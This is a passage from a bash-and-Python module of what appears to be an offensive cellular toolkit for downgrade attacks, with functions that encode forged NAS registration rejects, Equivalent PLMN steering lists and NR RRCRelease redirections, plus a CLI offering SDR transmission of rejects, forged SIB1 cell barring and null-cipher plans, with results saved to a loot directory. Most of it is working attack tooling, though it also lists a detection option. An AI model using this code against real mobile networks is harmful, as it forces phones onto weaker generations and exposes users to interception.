            printf 'ERROR\tPLMN %s is not mcc-mnc\n' "$(printf '%s' "$plmn" | tr -cd '0-9A-Za-z-')" >&2
            return 2
        fi
    done
    (( n > 0 )) || { printf 'ERROR\tno PLMN in the list\n' >&2; return 2; }
    (( n <= 15 )) || {
        printf 'ERROR\t%d entries: an EPLMN IE holds at most 15, a second IE is a second message\n' "$n" >&2
        return 2; }
    printf '%02X%s' "$(( n * 3 ))" "$out"
    printf '\tentries\t%d\n' "$n" >&2
}

# dwn_cmd_build_steer <mcc> <mnc> <eplmn list> [<cause>]
#   A reject that removes the serving PLMN and offers a replacement set.
dwn_cmd_build_steer() {
    local mcc="${1:-001}" mnc="${2:-01}" list="${3:-}" cause="${4:-15}"
    [[ -n "$list" ]] || {
        printf 'ERROR\tusage: --build-steer <mcc> <mnc> <plmn,plmn,...> [cause]\n' >&2; return 2; }

    local eplmn rows
    eplmn=$(dwn_build_eplmn "$list" 2>/dev/null) || { dwn_build_eplmn "$list" >/dev/null; return 2; }
    local served
    served=$(dwn_plmn_bcd "$mcc" "$mnc") || return 2

    printf 'field\tvalue\n'
    printf 'serving_plmn\t%s-%s\t%s\n' "$mcc" "$mnc" "$served"
    printf 'reject_cause\t%s\n' "$cause"

    # Cause 15 (No suitable cells in tracking area) is the one that means
    # "leave and try elsewhere"; a reject with another cause does not steer.
    case "$cause" in
        15) printf 'cause_effect\tthe UE must not choose this TA again and looks elsewhere\n' ;;
        12) printf 'cause_effect\ttracking area not allowed — the UE leaves the TA\n' ;;
        13) printf 'cause_effect\troaming not allowed in this TA\n' ;;
        *)  printf 'cause_effect\tthis cause does not force a reselection; an EPLMN riding it is advisory\n' ;;
    esac
    printf 'eplmn_ie\t%s\n' "$eplmn"
    printf 'eplmn_note\tthe list replaces nothing; it widens what the UE may pick, and the UE keeps its own PLMNwAcT\n'
    printf 'sor_cmci\tnot sent: a forged SoR packet fails MAC verification at the UICC, so the steering has to come from the reject\n'
    printf 'limit\tthe reject must arrive inside the authenticated NAS connection of the UE; without that it is discarded as unprotected\n'
    printf 'cross_ref\t16_sim.sh --plmn-lists decodes the card half, --sor-decode the packet envelope\n'
    return 0
}

# ── CLI dispatch ────────────────────────────────────────────────────────
# ── EPS fallback: the NR -> LTE command set (TS 23.502 4.13, TS 38.331) ──
# An NR UE reaches E-UTRAN two ways, and they are different messages with
# different owners:
#   core half  a 5GMM registration reject carrying cause 31 "Redirection to EPC
#              required" (TS 24.501 9.11.3.2). This is the EPS-fallback trigger
#              3GPP specifies in TS 23.502 4.13.2.2, and it needs no radio.
#   RAN half   an RRCRelease whose redirectedCarrierInfo is the eutra branch
#              (TS 38.331 6.2.2). This is what actually moves the UE once N1
#              is gone, and it is emitted by the gNB, not the core.
#
# What the NR grammar does NOT have is a UTRAN branch. RedirectedCarrierInfo is
# CHOICE { nr, eutra } with no extension -- a fact this module reads out of
# pycrate's ASN.1 at run time rather than asserting from memory -- so an
# "NR -> 3G redirection" cannot be one RRCRelease. It is two messages on two
# generations, which is the nr-utran-redirect plan. --redirect utra refuses by
# name instead of encoding a field that does not exist.
#
# The RRC half is encoded by pycrate, which vendors TS 38.331 as executable
# ASN.1: an independent implementation of the specification, not this tree's
# arithmetic read back to itself. The script is written out here rather than
# added to tools/ because this module owns exactly one file.
dwn_nr_rrc_py() {
    local want="${DWN_NR_RRC_PY:-}" c
    for c in "$want" "${LTE_ORACLE_PY:-}" \
             "$HOME/.lte-oracles/venv/bin/python" \
             "$IMSISTING_ROOT/tools/../.venv/bin/python3" \
             "$IMSISTING_ROOT/venv/bin/python3" /tmp/pycvenv/bin/python3 \
             python3; do
        [[ -n "$c" ]] || continue
        [[ -x "$c" || "$c" == "python3" ]] || continue
        if "$c" -c 'from pycrate_asn1dir import RRCNR' >/dev/null 2>&1; then
            printf '%s\n' "$c"; return 0
        fi
    done
    return 1
}

dwn_nr_rrc_script() {
    local dst="$1"
    cat > "$dst" <<'DWN_NR_RRC'
#!/usr/bin/env python3
"""Encode the NR RRCRelease that redirects a UE, with pycrate's TS 38.331 grammar.

pycrate vendors the NR RRC ASN.1 as executable code, so the octets below come
from an independent implementation of the specification rather than from this
tree's own arithmetic. The script reports which alternatives
RedirectedCarrierInfo actually has -- read from the schema, never guessed --
and re-decodes its own output to the same bytes before printing them.
"""
import sys


def row(*v):
    sys.stdout.write("\t".join(str(x) for x in v) + "\n")


def grey(why):
    row("rrc_state", "unobserved")
    row("reason_rrc", why)
    sys.exit(1)


try:
    from pycrate_asn1dir import RRCNR
except Exception as exc:
    grey("pycrate RRCNR is not importable (%s): the NR RRC grammar is vendored "
         "by pycrate and this module does not re-implement TS 38.331 ASN.1 by "
         "hand, so the RRC half is grey rather than guessed" % exc)

ARGS = sys.argv[1:]
branch, arfcn, tx, cn_type = "eutra", None, 0, ""
i = 0
while i < len(ARGS):
    a = ARGS[i]
    if a not in ("--branch", "--arfcn", "--tx", "--cn-type"):
        grey("unknown argument %r" % a)
    if i + 1 >= len(ARGS):
        grey("%s needs a value" % a)
    v = ARGS[i + 1]
    if a == "--branch":
        branch = v
    elif a == "--arfcn":
        arfcn = v
    elif a == "--tx":
        tx = v
    else:
        cn_type = v
    i += 2

try:
    arfcn = int(arfcn)
    tx = int(tx)
except (TypeError, ValueError):
    grey("--arfcn and --tx must be decimal integers")

D = RRCNR.NR_RRC_Definitions
CHOICE = D.RedirectedCarrierInfo
ALTS = list(getattr(CHOICE, "_root", None) or [])
row("rrc_schema", "pycrate RRCNR.NR_RRC_Definitions (vendored TS 38.331)")
row("redirect_branches", ",".join(ALTS) if ALTS else "unobserved")
row("redirect_choice", branch)
if branch not in ALTS:
    grey("RedirectedCarrierInfo is the CHOICE {%s} with no extension in the "
         "grammar: %r is not a branch, so neither redirectedCarrierInfo nor any "
         "other field of this message can carry it"
         % (", ".join(ALTS), branch))

alt = CHOICE.get_at([branch])
freq = "eutraFrequency" if branch == "eutra" else "carrierFreq"
try:
    alt.get_at([freq])._safechk_bnd(arfcn)
    row("redirect_arfcn_in_schema_range", "yes")
except Exception as exc:
    grey("%s is outside the range the grammar gives the field (%s: %s)"
         % (freq, type(exc).__name__, exc))

fields = {freq: arfcn}
if branch == "eutra" and cn_type:
    fields["cnType"] = cn_type
try:
    D.DL_DCCH_Message.set_val({"message": ("c1", ("rrcRelease", {
        "rrc-TransactionIdentifier": tx,
        "criticalExtensions": ("rrcRelease", {
            "redirectedCarrierInfo": (branch, fields)}),
    }))})
    pdu = D.DL_DCCH_Message.to_uper()
    if isinstance(pdu, tuple):  # pycrate returns octets, or (octets, nbits)
        pdu = pdu[0]
except Exception as exc:
    grey("the grammar rejected the value (%s: %s)" % (type(exc).__name__, exc))

row("rrc_pdu_hex", pdu.hex().upper())
row("rrc_pdu_octets", len(pdu))
row("rrc_pdu_bits", len(pdu) * 8)
row("rrc_pdu_padding",
    "to_uper() pads to whole octets, so the PDU is this octet string and the "
    "bit count is octets x 8")
try:
    D.DL_DCCH_Message.from_uper(pdu)
    D.DL_DCCH_Message.set_val(D.DL_DCCH_Message.get_val())
    again = D.DL_DCCH_Message.to_uper()
    if isinstance(again, tuple):
        again = again[0]
except Exception as exc:
    grey("re-decode of the encoded bytes failed (%s: %s)"
         % (type(exc).__name__, exc))
row("rrc_decode_check", "ok" if again == pdu else "mismatch")
row("rrc_fields", "message.c1.rrcRelease{ rrc-TransactionIdentifier=%d, "
    "criticalExtensions.rrcRelease.redirectedCarrierInfo=%s }" % (tx, branch))
if again != pdu:
    grey("decode then re-encode produced different octets: %s" % again.hex().upper())
row("rrc_state", "ok")
sys.exit(0)
DWN_NR_RRC
}

# dwn_nr_rrc_redirect <eutra|nr> <arfcn> [tx]: the RAN half of a fallback.
dwn_nr_rrc_redirect() {
    local branch="${1:-}" arfcn="${2:-}" tx="${3:-0}" py script out
    if ! py=$(dwn_nr_rrc_py); then
        printf 'rrc_state\tunobserved\n'
        printf 'reason_rrc\tno interpreter with pycrate_asn1dir.RRCNR found (tried %s); the NR RRC grammar is vendored by pycrate and this module does not re-implement TS 38.331 ASN.1 by hand, so the RRC half is grey rather than guessed. Set DWN_NR_RRC_PY to an interpreter that has pycrate.\n' \
            "$(dwn_sanitize "${DWN_NR_RRC_PY:-unset, LTE_ORACLE_PY, ~/.lte-oracles, .venv, venv, /tmp/pycvenv, python3}")"
        return 1
    fi
    script="$MOD_TMP/nr_rrc_redirect.py"
    dwn_nr_rrc_script "$script" || {
        printf 'rrc_state\tunobserved\n'
        printf 'reason_rrc\tcannot write the encoder script to %s\n' "$(dwn_sanitize "$script")"
        return 1; }
    if ! out=$("$py" "$script" --branch "$branch" --arfcn "$arfcn" --tx "$tx" 2>&1); then
        printf '%s\n' "$out"
        return 1
    fi
    printf '%s\n' "$out"
    return 0
}

dwn_store_fallbacks() {
    local d="${DWN_DIR:-$LOOT_DIR/downgrade}"
    mkdir -p "$d" 2>/dev/null || return 1
    printf '%s/fallbacks.tsv\n' "$d"
}

# --build-fallback: the whole EPS-fallback command set, both halves, offline.
dwn_cmd_build_fallback() {
    local redirect="eutra" arfcn="" cause="31" tx="0"
    while (( $# )); do
        case "$1" in
            --redirect) redirect="${2:-}"; shift 2 ;;
            --arfcn)    arfcn="${2:-}";    shift 2 ;;
            --cause)    cause="${2:-}";    shift 2 ;;
            --tx)       tx="${2:-}";       shift 2 ;;
            -h|--help)
                cat <<'EOF'
usage: --build-fallback [--redirect eutra|nr|utra] --arfcn <n> [--cause <n>] [--tx <n>]
  eutra  the 5GMM reject (cause 31 by default, TS 24.501 9.11.3.2) plus the
         NR RRCRelease redirectedCarrierInfo=eutra (TS 38.331 6.2.2)
  nr     the RRCRelease redirecting to another NR carrier; no NAS half exists
         because there is no generation change to force
  utra   refused by name: RedirectedCarrierInfo has no UTRAN branch, so NR->3G
         is two messages (--plan nr-utran-redirect)
EOF
                return 0 ;;
            -*) printf 'ERROR\tunknown option: %s\n' "$(dwn_sanitize "$1")" >&2; return 2 ;;
            *)  printf 'ERROR\tunexpected argument: %s\n' "$(dwn_sanitize "$1")" >&2; return 2 ;;
        esac
    done
    case "$redirect" in
        eutra|nr) ;;
        utra|utran|3g|3G)
            printf 'ERROR\tNR RRC carries no UTRAN redirection branch\n' >&2
            printf 'reason\tTS 38.331 RedirectedCarrierInfo is the CHOICE { nr, eutra } with no extension, and pycrate RRCNR reports exactly those two root alternatives, so an RRCRelease cannot point an NR UE at UTRAN. The 3G leg is a second message on a second generation: the E-UTRAN RRCConnectionRelease whose own RedirectedCarrierInfo carries utra-fdd or utra-tdd (TS 36.331 6.2.2), or CS fallback (TS 23.272). Run --plan nr-utran-redirect for the two-leg procedure. This module refuses to encode a field the grammar does not have.\n' >&2
            return 1 ;;
        *) printf 'ERROR\t--redirect must be eutra, nr or utra: %s\n' "$(dwn_sanitize "$redirect")" >&2; return 2 ;;
    esac
    [[ -n "$arfcn" ]] || {
        printf 'ERROR\t--arfcn is required: the carrier the UE is redirected to (an E-UTRA EARFCN for eutra, an NR ARFCN for nr). It is not derivable from a capture here -- redirectedCarrierInfo is what the operator chooses.\n' >&2
        return 2; }
    [[ "$arfcn" =~ ^[0-9]+$ ]] || {
        printf 'ERROR\t--arfcn must be a decimal number: %s\n' "$(dwn_sanitize "$arfcn")" >&2; return 2; }
    local hi ref
    if [[ "$redirect" == eutra ]]; then
        hi=262143
        ref="ARFCN-ValueEUTRA 0..maxEARFCN, maxEARFCN=262143 (TS 38.331 6.3.2 with TS 36.101)"
    else
        hi=3279165
        ref="ARFCN-ValueNR 0..maxNARFCN, maxNARFCN=3279165 (TS 38.331 6.3.2 with TS 38.104)"
    fi
    (( arfcn <= hi )) || {
        printf 'ERROR\t--arfcn %s is outside %s\n' "$(dwn_sanitize "$arfcn")" "$ref" >&2
        return 2; }
    [[ "$cause" =~ ^[0-9]+$ ]] || {
        printf 'ERROR\t--cause must be a decimal number: %s\n' "$(dwn_sanitize "$cause")" >&2; return 2; }
    [[ "$tx" =~ ^[0-9]+$ ]] || {
        printf 'ERROR\t--tx must be a decimal number (rrc-TransactionIdentifier 0..3): %s\n' "$(dwn_sanitize "$tx")" >&2; return 2; }
    (( tx <= 3 )) || {
        printf 'ERROR\t--tx is the rrc-TransactionIdentifier, 0..3 in TS 38.331\n' >&2; return 2; }

    local direction nas_hex="" nas_cause="" nas_rat="none" nas_mean=""
    if [[ "$redirect" == eutra ]]; then
        direction="5g-to-lte"
        nas_rat="5GMM"
        local nas_out
        nas_out=$(dwn_nas_reject_build 5GMM "$cause" attach) || {
            printf 'ERROR\t5GMM has no registration reject carrying cause %s\n' "$(dwn_sanitize "$cause")" >&2
            printf 'reason\tTS 24.501 9.11.3.2 assigns the 5GMM causes and --causes lists the ones this module knows. Cause 31 is the one TS 23.502 4.13.2.2 names for EPS fallback.\n' >&2
            return 1; }
        nas_hex=$(printf '%s\n' "$nas_out" | awk -F'\t' '$1=="msg_hex"{print $2; exit}')
        nas_cause=$(printf '%s\n' "$nas_out" | awk -F'\t' '$1=="cause"{print $2; exit}')
        nas_mean=$(dwn_cause_name 5GMM "$nas_cause")
    else
        direction="5g-to-nr"
    fi

    printf 'verb\tbuild-fallback\n'
    printf 'redirect_choice\t%s\n'   "$redirect"
    printf 'redirect_arfcn\t%s\n'    "$arfcn"
    printf 'arfcn_reference\t%s\n'   "$ref"
    printf 'direction\t%s\n'         "$direction"
    if [[ "$redirect" == eutra ]]; then
        printf 'nas_rat\t%s\n'       "$nas_rat"
        printf 'nas_kind\tattach\n'
        printf 'nas_cause\t%s\n'     "$nas_cause"
        printf 'nas_msg_hex\t%s\n'   "$nas_hex"
        printf 'nas_mean\t%s\n'      "$(dwn_sanitize "$nas_mean")"
        printf 'nas_owner\tcore: TS 24.501 9.11.3.2 cause 31, the EPS-fallback trigger of TS 23.502 4.13.2.2 (no radio involved)\n'
        printf 'nas_referee\tpycrate_mobile.NAS -- the same hex is decoded and re-encoded by dwn_nas_decode_oracle in --selftest\n'
    else
        printf 'nas_state\tnot_applicable\n'
        printf 'reason_nas\tredirecting an NR UE to another NR carrier is not a fallback: no generation change happens, so the RRC half is the whole message\n'
    fi
    printf 'rrc_message\tDL-DCCH-Message{ rrcRelease }\n'
    printf 'rrc_ie\tredirectedCarrierInfo=%s\n' "$redirect"
    printf 'rrc_owner\tRAN: TS 38.331 6.2.2, emitted by the gNB and independent of the NAS reject above\n'
    local rrc_out rrc_rc rrc_hex rrc_state
    rrc_out=$(dwn_nr_rrc_redirect "$redirect" "$arfcn" "$tx"); rrc_rc=$?
    printf '%s\n' "$rrc_out"
    rrc_hex=$(printf '%s\n' "$rrc_out" | awk -F'\t' '$1=="rrc_pdu_hex"{print $2; exit}')
    rrc_state=$(printf '%s\n' "$rrc_out" | awk -F'\t' '$1=="rrc_state"{print $2; exit}')
    printf 'utran_redirect\tunobserved\n'
    printf 'reason_utran\tNR RRC has no UTRAN alternative in RedirectedCarrierInfo, so this message cannot redirect to 3G at all; the 3G leg belongs to the E-UTRAN cell (TS 36.331 6.2.2 utra-fdd/utra-tdd) or to CS fallback (TS 23.272). See --plan nr-utran-redirect.\n'
    printf 'verdict\tfallback_command_set_built\n'

    local store
    if store=$(dwn_store_fallbacks); then
        [[ -s "$store" ]] || printf 'ts\tbranch\tdirection\tarfcn\tnas_rat\tnas_cause\tnas_msg_hex\trrc_pdu_hex\trrc_state\n' > "$store"
        printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' \
            "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "$redirect" "$direction" "$arfcn" \
            "$nas_rat" "$nas_cause" "$nas_hex" "$rrc_hex" \
            "${rrc_state:-unobserved}" >> "$store"
    fi

    if [[ "$rrc_state" != ok ]]; then
        printf 'note\tthe NAS half above is real; the RRC half is grey, and the reason is printed with it\n' >&2
        return 1
    fi
    return $rrc_rc
}

dwn_cli_main() {
    local cmd="${1:-}"
    (($# > 0)) && shift
    case "$cmd" in
        --status-tsv)        dwn_cli_status_tsv ;;
        --reject-cause)      dwn_cmd_reject_cause "${1:-}" "${2:-}" ;;
        --null-cipher-table) dwn_cmd_null_table ;;
        --build-security-mode) dwn_cmd_build_smc "${1:-}" "${2:-NR}" ;;
        --build-reject)      dwn_cmd_build_reject "${1:-}" "${2:-}" "${3:-attach}" ;;
        --tx-reject)         dwn_cmd_tx_reject "${1:-}" "${2:-}" "${3:-attach}" ;;
        --build-sib1)        dwn_build_sib1 "${1:-001}" "${2:-01}" "${3:-1}" "${4:-0}" "${5:-barred}" "${6:-notAllowed}" ;;
        --build-steer)       dwn_cmd_build_steer "${1:-001}" "${2:-01}" "${3:-}" "${4:-15}" ;;
        --build-fallback)    dwn_cmd_build_fallback "$@" ;;
        --detect)            dwn_cmd_detect "${1:-}" ;;
        --path)              dwn_cmd_path "${1:-}" ;;
        --plan)              dwn_cmd_plan "${1:-}" ;;
        --causes)            dwn_causes ;;
        --selftest)          dwn_selftest ;;
        --menu)              dwn_menu ;;
        *)
            cat >&2 <<EOF
Downgrade Attacks — cross-generation steering and null-cipher exposure

Usage: $0 COMMAND
  --status-tsv                    SDR, table and plan state as TSV
  --reject-cause <n> [RAT]        look up a real reject cause (5GMM|EMM|GMM)
                                  and the cause IE it is carried in
  --null-cipher-table             NEA0/EEA0/UEA0/A5-0 across all generations
  --build-security-mode <alg> [RAT]
                                  the Security Mode Command algorithm octet
  --build-reject <EMM|5GMM|GMM> <cause> [attach|tau|service]
                                  the whole NAS reject message: header,
                                  message type and the mandatory cause IE
  --tx-reject <EMM|5GMM|GMM> <cause> [attach|tau|service]
                                  the same reject carried in a
                                  DLInformationTransfer over the real
                                  DL-SCH/PDSCH chain, to the SDR
  --build-sib1 <mcc> <mnc> <tac> <cellid> [barred|notBarred] [allowed|notAllowed]
                                  a SIB1 body with cellBarred and
                                  intraFreqReselection set — the forged-SIB
                                  suppress-a-RAT vector, encoding half
  --build-steer <mcc> <mnc> <plmn,plmn,...> [cause]
                                  a reject carrying an Equivalent PLMN list:
                                  the network half of Steering of Roaming
  --build-fallback [--redirect eutra|nr|utra] --arfcn <n> [--cause <n>] [--tx <n>]
                                  the EPS-fallback command set: a 5GMM
                                  registration reject (cause 31 by default,
                                  TS 24.501 9.11.3.2) plus the NR RRCRelease
                                  whose redirectedCarrierInfo is the eutra
                                  branch (TS 38.331 6.2.2), encoded against
                                  pycrate's ASN.1 and re-decoded before it is
                                  printed. --redirect utra is refused by name:
                                  NR RRC has no UTRAN branch, so the 3G leg is
                                  --plan nr-utran-redirect (two messages).
  --detect <pcap|records.tsv>     find a downgrade: steering reject, RAT
                                  change, or a cipher change to null
  --path <name>                   describe a downgrade mechanism
                                  (steer-down|jamming-suppress|cs-fallback|
                                   forged-sib|sni5gect)
  --causes                        the full assigned cause table
  --plan <name>                   write a handoff plan naming the hardware
                                  (steer-down|jamming-suppress|cs-fallback|
                                   forged-sib|sni5gect|eps-fallback|
                                   nr-utran-redirect)
  --selftest                      verify the tables and encoders without a radio
  --menu                          interactive menu

The record TSV format read by --detect is: ts <TAB> rat <TAB> event <TAB> detail
EOF
            return 2 ;;
    esac
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    set -o pipefail
    IMSISTING_CLI=1
    : "${TMP_DIR:=/tmp/imsisting}"
    declare -F banner >/dev/null 2>&1 || banner() { :; }
    declare -F info   >/dev/null 2>&1 || info()   { printf '[info] %s\n' "$*" >&2; }
    declare -F warn   >/dev/null 2>&1 || warn()   { printf '[warn] %s\n' "$*" >&2; }
    declare -F err    >/dev/null 2>&1 || err()    { printf '[err]  %s\n' "$*" >&2; }
    declare -F ok     >/dev/null 2>&1 || ok()     { printf '[ok]   %s\n' "$*" >&2; }
    dwn_cli_main "$@"
fi
